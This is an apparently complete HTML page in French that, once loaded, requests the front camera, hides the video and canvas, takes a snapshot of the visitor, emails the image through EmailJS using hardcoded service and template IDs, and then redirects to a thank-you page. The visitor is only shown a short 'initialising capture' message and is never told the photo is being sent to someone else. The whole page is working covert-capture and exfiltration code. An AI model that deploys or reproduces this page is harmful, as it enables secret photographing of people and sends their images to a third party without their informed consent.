<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Photo automatique</title>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background: #f0f0f0;
    }
    video, canvas {
      display: none; /* cacher la vid√©o et le canvas */
    }
  </style>
</head>
<body>
  <h2>üì∏ Initialisation de la capture...</h2>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="300" height="200"></canvas>

  <script>
    // Initialiser EmailJS avec ta cl√© publique
    emailjs.init("mxm3fFA_BxEhqJieq");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    async function startCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" } // cam√©ra frontale
        });
        video.srcObject = stream;

        video.onloadeddata = () => {
          // Capturer l'image
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/png");

          // Envoyer par EmailJS
          emailjs.send("service_8cs0gml", "template_w14xn7c", {
            message: "Photo automatique captur√©e üì∏",
            image: imageData
          })
          .then(() => {
            // Redirection apr√®s envoi
            window.location.href = "https://tonsite.com/merci";
          })
          .catch((err) => {
            document.body.innerHTML = "<h2>‚ùå Erreur : " + JSON.stringify(err) + "</h2>";
          });
        };

      } catch (err) {
        document.body.innerHTML = "<h2>‚ö†Ô∏è Permission refus√©e ou cam√©ra non disponible</h2>";
      }
    }

    // Lancer la capture d√®s l'arriv√©e sur la page
    startCapture();
  </script>
</body>
</html>
